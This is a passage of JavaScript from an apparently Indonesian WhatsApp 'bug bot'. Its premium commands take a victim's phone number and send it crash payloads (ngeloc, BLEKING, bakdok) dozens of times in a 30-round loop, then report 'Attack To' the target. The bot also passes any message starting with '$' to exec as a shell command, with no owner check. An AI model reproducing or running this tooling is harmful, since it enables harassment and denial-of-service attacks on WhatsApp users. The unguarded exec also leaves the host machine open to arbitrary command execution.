_! 𝐉𝐢𝐤𝐚 𝐓𝐢𝐝𝐚𝐤 𝐂𝟏 𝐌𝐚𝐤𝐚 𝐃𝐞𝐥𝐚𝐲 𝐌𝐚𝐤𝐞𝐫 !_

[ 𝙺𝚊𝚕𝚘 𝚋𝚞𝚐 𝚘𝚛𝚊𝚗𝚐 𝚊𝚝𝚊𝚞 𝚋𝚞𝚕𝚕𝚢 𝚘𝚛𝚊𝚗𝚐 𝚓𝚊𝚗𝚐𝚊𝚗 𝚊𝚗𝚎𝚑 𝚊𝚗𝚎𝚑 𝚜𝚊𝚖𝚊 andra 𝙜𝙖𝙗𝙪𝙩𝙖𝙣 ] 🥶🥵`)
}
break

case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-forger': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`Example: ${prefix + command} 62×××`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
reply(bugres)
for (let j = 0; j < 30; j++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
await reply(`━━━━━━━巛 Ada biji lah 彡

🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃

┈┈┈┈▕▔╱▔▔▔━▁
┈┈┈▕▔╱╱╱👁┈╲▂▔▔╲
┈┈▕▔╱╱╱╱💧▂▂▂▂▂▂▏
┈▕▔╱▕▕╱╱╱┈▽▽▽▽▽
▕▔╱┊┈╲╲╲╲▂△△△△
▔╱┊┈╱▕╲▂▂▂▂▂▂╱
╱┊┈╱┉▕┉┋╲┈ KASHIAN 
┗━━━━━━━━━━━━━━━━━━┛
⌕ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐨 ⚊≫  ${target} ☠︎
⌥ 𝐓𝐲𝐩𝐞 𝐁𝐮𝐠 >> ${command} 
𝐒𝐜𝐫𝐢𝐩𝐭 𝐕 4.0 𝐌𝐞𝐦𝐚𝐧𝐠 𝐆𝐚𝐝𝐚 𝐎𝐛𝐚𝐭 ⃟🥶⃟
𝐒𝐮𝐜𝐜𝐞𝐬 𝐁𝐮𝐠 !!

_! 𝐉𝐢𝐤𝐚 𝐓𝐢𝐝𝐚𝐤 𝐂𝟏 𝐌𝐚𝐤𝐚 𝐃𝐞𝐥𝐚𝐲 𝐌𝐚𝐤𝐞𝐫 !_

[ 𝙺𝚊𝚕𝚘 𝚋𝚞𝚐 𝚘𝚛𝚊𝚗𝚐 𝚊𝚝𝚊𝚞 𝚋𝚞𝚕𝚕𝚢 𝚘𝚛𝚊𝚗𝚐 𝚓𝚊𝚗𝚐𝚊𝚗 𝚊𝚗𝚎𝚑 𝚊𝚗𝚎𝚑 𝚜𝚊𝚖𝚊 andra 𝙜𝙖𝙗𝙪𝙩𝙖𝙣 ] 🥶🥵`)
}
break

case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-forger': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`Example: ${prefix + command} 62×××`)
let target = bijipler + '@s.whatsapp.net'
reply(bugres)
await reply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
await reply(`━━━━━━━巛彡

🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃

┈┈┈┈▕▔╱▔▔▔━▁
┈┈┈▕▔╱╱╱👁┈╲▂▔▔╲
┈┈▕▔╱╱╱╱💧▂▂▂▂▂▂▏
┈▕▔╱▕▕╱╱╱┈▽▽▽▽▽
▕▔╱┊┈╲╲╲╲▂△△△△
▔╱┊┈╱▕╲▂▂▂▂▂▂╱
╱┊┈╱┉▕┉┋╲┈ KASHIAN 
┗━━━━━━━━━━━━━━━━━━┛
⌕ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐨 ⚊≫  ${target} ☠︎
⌥ 𝐓𝐲𝐩𝐞 𝐁𝐮𝐠 >> ${command} 
𝐒𝐜𝐫𝐢𝐩𝐭 𝐕 3.0 𝐌𝐞𝐦𝐚𝐧𝐠 𝐆𝐚𝐝𝐚 𝐎𝐛𝐚𝐭 ⃟🥶⃟
𝐒𝐮𝐜𝐜𝐞𝐬 𝐁𝐮𝐠 !!

_! 𝐉𝐢𝐤𝐚 𝐓𝐢𝐝𝐚𝐤 𝐂𝟏 𝐌𝐚𝐤𝐚 𝐃𝐞𝐥𝐚𝐲 𝐌𝐚𝐤𝐞𝐫 !_

[ 𝙺𝚊𝚕𝚘 𝚋𝚞𝚐 𝚘𝚛𝚊𝚗𝚐 𝚊𝚝𝚊𝚞 𝚋𝚞𝚕𝚕𝚢 𝚘𝚛𝚊𝚗𝚐 𝚓𝚊𝚗𝚐𝚊𝚗 𝚊𝚗𝚎𝚑 𝚊𝚗𝚎𝚑 𝚜𝚊𝚖𝚊 andra =𝙜𝙖𝙗𝙪𝙩𝙖𝙣 ] 🥶🥵`)
}
break
				
default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
kandiXD.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})